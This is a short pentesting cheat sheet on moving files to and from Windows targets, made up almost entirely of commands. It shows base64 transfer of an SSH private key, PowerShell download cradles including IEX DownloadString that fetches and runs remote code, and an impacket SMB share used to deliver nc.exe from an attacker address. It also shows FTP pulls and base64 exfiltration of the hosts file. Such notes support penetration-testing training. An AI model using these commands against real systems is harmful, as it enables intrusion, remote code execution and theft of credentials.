# Windows File Transfer

###

```shell
  cat id_rsa | base64 -w 0;echo

  //target powershell windows machine
  [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64_string>"))

  //Verifying
  md5sum id_rsa
  Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

```shell
  (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
  (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
  IEX (New-Object Net.WebClient).DownloadString('<full_url>')
  (New-Object Net.WebClient).DownloadString('<full_url>') | IEX
  Invoke-WebRequest <full_url> -OutFile PowerView.ps1 -UseBasicParsing
```

```shell
  impacket-smbserver share -smb2support /tmp/smbshare
  impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

  copy \\192.168.220.133\share\nc.exe
  net use n: \\192.168.220.133\share /user:test test
```

```shell
  python3 -m pyftpdlib --port 21

  (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

```shell
  [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

  echo <base64_encoding> | base64 -d > hosts
```

---
